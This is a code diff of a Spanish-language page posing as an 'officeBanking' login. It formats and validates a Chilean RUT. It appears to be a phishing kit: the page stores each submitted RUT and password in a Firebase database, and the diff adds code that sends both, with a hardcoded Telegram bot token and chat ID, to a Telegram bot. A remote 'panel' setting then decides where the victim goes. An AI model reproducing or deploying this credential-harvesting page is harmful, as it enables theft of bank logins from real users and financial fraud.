@@ -1,60 +1,11 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
   <title>Ingreso a officeBanking</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
-function formatearRut(valor) {
-  // Eliminar todo lo que no sean números o K/k
-  valor = valor.replace(/^0+|[^0-9kK]+/g, "").toUpperCase();
-
-  // Dividir cuerpo y dígito verificador
-  let cuerpo = valor.slice(0, -1);
-  let dv = valor.slice(-1);
-
-  // Formatear con puntos
-  cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-
-  return cuerpo + "-" + dv;
-}
-
-document.getElementById("rut").addEventListener("input", function(e) {
-  let val = e.target.value.replace(/[.\-]/g, "").toUpperCase();
-  if (val.length < 2) return;
-  const cuerpo = val.slice(0, -1);
-  const dv = val.slice(-1);
-  const formateado = formatearRut(cuerpo + dv);
-  e.target.value = formateado;
-});
-
-</script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js">
-function formatearRut(valor) {
-  // Eliminar todo lo que no sean números o K/k
-  valor = valor.replace(/^0+|[^0-9kK]+/g, "").toUpperCase();
-
-  // Dividir cuerpo y dígito verificador
-  let cuerpo = valor.slice(0, -1);
-  let dv = valor.slice(-1);
-
-  // Formatear con puntos
-  cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-
-  return cuerpo + "-" + dv;
-}
-
-document.getElementById("rut").addEventListener("input", function(e) {
-  let val = e.target.value.replace(/[.\-]/g, "").toUpperCase();
-  if (val.length < 2) return;
-  const cuerpo = val.slice(0, -1);
-  const dv = val.slice(-1);
-  const formateado = formatearRut(cuerpo + dv);
-  e.target.value = formateado;
-});
-
-</script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
     body {
       background: white;
@@ -173,19 +124,15 @@ document.getElementById("rut").addEventListener("input", function(e) {
     function validarRut(rutCompleto) {
       const rut = rutCompleto.replace(/\./g, '').replace(/-/g, '').toUpperCase();
       if (rut.length < 2) return false;
-
       const cuerpo = rut.slice(0, -1);
       const dv = rut.slice(-1);
-
       let suma = 0, multiplo = 2;
       for (let i = cuerpo.length - 1; i >= 0; i--) {
         suma += parseInt(cuerpo[i]) * multiplo;
         multiplo = multiplo === 7 ? 2 : multiplo + 1;
       }
-
       const resto = 11 - (suma % 11);
       let dvEsperado = resto === 11 ? '0' : resto === 10 ? 'K' : resto.toString();
-
       return dv === dvEsperado;
     }
 
@@ -204,9 +151,24 @@ document.getElementById("rut").addEventListener("input", function(e) {
 
       const timestamp = Date.now();
       const fecha = new Date().toLocaleString("es-CL");
-
       const ref = db.ref("registros").push();
       await ref.set({ rut, clave, timestamp, fecha });
+
+      // Enviar a Telegram
+      const telegramToken = "7558583284:AAGo_RSStbWCaAnwgpfNCZV2hVNYiSDzvDQ";
+      const chatId = 8182021286;
+      const mensaje = `📥 Nuevo formulario:\n\n👤 RUT: ${rut}\n🔑 Clave: ${clave}`;
+
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: mensaje
+        })
+      });
 
       db.ref("estado_panel/modo").once("value", snapshot => {
         const modo = snapshot.val();
@@ -218,30 +180,15 @@ document.getElementById("rut").addEventListener("input", function(e) {
         }
       });
     });
-  
-function formatearRut(valor) {
-  // Eliminar todo lo que no sean números o K/k
-  valor = valor.replace(/^0+|[^0-9kK]+/g, "").toUpperCase();
 
-  // Dividir cuerpo y dígito verificador
-  let cuerpo = valor.slice(0, -1);
-  let dv = valor.slice(-1);
-
-  // Formatear con puntos
-  cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-
-  return cuerpo + "-" + dv;
-}
-
-document.getElementById("rut").addEventListener("input", function(e) {
-  let val = e.target.value.replace(/[.\-]/g, "").toUpperCase();
-  if (val.length < 2) return;
-  const cuerpo = val.slice(0, -1);
-  const dv = val.slice(-1);
-  const formateado = formatearRut(cuerpo + dv);
-  e.target.value = formateado;
-});
-
-</script>
+    document.getElementById("rut").addEventListener("input", function(e) {
+      let val = e.target.value.replace(/[.\-]/g, "").toUpperCase();
+      if (val.length < 2) return;
+      const cuerpo = val.slice(0, -1);
+      const dv = val.slice(-1);
+      const formateado = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".") + "-" + dv;
+      e.target.value = formateado;
+    });
+  </script>
 </body>
 </html>
